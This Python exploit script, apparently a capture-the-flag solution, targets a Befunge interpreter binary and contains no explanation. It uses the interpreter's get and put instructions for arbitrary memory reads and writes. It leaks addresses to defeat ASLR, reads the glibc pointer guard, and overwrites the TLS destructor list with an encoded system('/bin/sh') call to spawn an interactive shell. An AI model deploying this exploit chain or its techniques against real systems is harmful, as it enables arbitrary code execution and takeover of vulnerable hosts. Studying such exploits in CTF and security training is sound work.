#/usr/bin/env python
# coding:utf-8

from ctf import *


binary = './befunge'
mode = args['MODE'].lower()
if mode == 'debug':
    io = debug(binary)
    io.b([])
    io.r()
else:
    io = process(binary)

context.arch = 'amd64'
elf = ELF(binary)
libc = ELF(filter(lambda x: 'libc.so' in x, elf.libs.keys())[0])

PROGRAM_PTR = 0x201fe0
TLS_DTORS_TO_LIBC = 0x7a4680 + 0x40
if mode == 'debug':
    TLS_DTORS_TO_LIBC = 0x59c680 + 0x40
TCB_TO_LIBC = TLS_DTORS_TO_LIBC + 0x40


def init():
    program = '''
>~11v
^ p <
    '''
    program = program.strip().split('\n')
    program += [''] * (25 - len(program))
    io.sendlines(program)
    io.clean(1)


def recv_chars(length):
    return ''.join(unordlist(map(lambda x: int(io.recvregex('^[^0-9-]*(-?\d+)\D', group=1)) & 0xff, xrange(8))))


def push_number(x):
    if x < 0:
        io.send(0)
        push_number(-x)
        io.send('-')
        return
    io.send(oct(x)[0])
    for i in oct(x)[1:]:
        io.send(8)
        io.send('*')
        io.send(i)
        io.send('+')


def read_relative(offset, length=8):
    push_number(offset)
    io.send('1+'.join([':0g.'] * length))
    io.send('$')
    return recv_chars(length)


def read(addr, length=8):
    global program_addr
    return read_relative(addr - program_addr)


def write_relative(offset, s):
    push_number(offset)
    s = [':~' + c + r'\0p' for c in s]
    io.send('1+'.join(s))
    io.send('$')


def write(addr, s):
    global program_addr
    return write_relative(addr - program_addr, s)


init()
program_addr = u64(read_relative(PROGRAM_PTR - elf.symbols['program']))
log.info('input program address: %#x', program_addr)

puts_addr = u64(read_relative(elf.got['puts'] - elf.symbols['program']))
log.info('puts address: %#x', puts_addr)
libc_addr = puts_addr - libc.symbols['puts']
log.info('libc address: %#x', libc_addr)
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + libc.search('/bin/sh').next()
tls_dtors_addr = libc_addr + TLS_DTORS_TO_LIBC
log.info('tls dtors address: %#x', tls_dtors_addr)

pointer_guard_addr = libc_addr + TCB_TO_LIBC + 0x30
pointer_guard = u64(read(pointer_guard_addr))
log.info('pointer guard: %#x', pointer_guard)

payload = p64(tls_dtors_addr + 8)
payload += p64(rol(system_addr ^ pointer_guard, 0x11)) # encrypt system pointer
payload += p64(binsh_addr)
write(tls_dtors_addr, payload)

# io.interrupt()
# io.b('__GI___call_tls_dtors')
# io.c()
io.send('@')
io.clean()

io.interactive()
